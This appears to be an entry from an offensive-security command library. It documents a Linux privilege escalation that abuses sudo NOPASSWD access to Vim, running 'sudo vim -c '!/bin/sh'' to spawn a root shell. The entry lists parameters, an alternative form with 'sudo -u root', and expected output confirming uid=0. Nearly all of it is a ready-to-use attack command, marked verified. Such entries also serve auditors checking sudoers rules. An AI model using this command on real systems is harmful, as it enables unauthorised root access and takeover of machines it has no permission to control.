---
id: efdfad3b-6385-461c-a4b9-ea0d222ea7eb
name: vim-spawn-root-shell
type: command
executor: bash
data: sudo vim -c '!/bin/sh'
output: null
created_at: '2023-04-06T03:56:17.742632+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - sudo
  - vim
verified: true
validated: true
---

# vim-spawn-root-shell

## Command

```bash
sudo vim -c '!/bin/sh'
```

## Description

This command exploits sudo NOPASSWD access to Vim by launching it as root and immediately executing a shell via Vim's ex command interface. It provides a quick root shell without needing to interact with the editor, ideal for privilege escalation in Linux environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sudo | Elevate to root using sudo | Yes |
| vim | The Vim editor binary | Yes |
| -c | Execute the following ex command | Yes |
| '!/bin/sh' | Shell escape to spawn /bin/sh as root | Yes |

## Examples

### Basic Usage

```bash
sudo vim -c '!/bin/sh'
```

### Alternative with Explicit User

```bash
sudo -u root vim -c '!/bin/sh'
```

## Expected Output

Vim briefly opens, then drops to a root shell prompt:

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

Success is indicated by the root prompt (#) and confirmation commands showing uid=0.

## Related

- [[procedures/Linux-SUDO-NOPASSWD-Privilege-Escalation-via-Vim]]
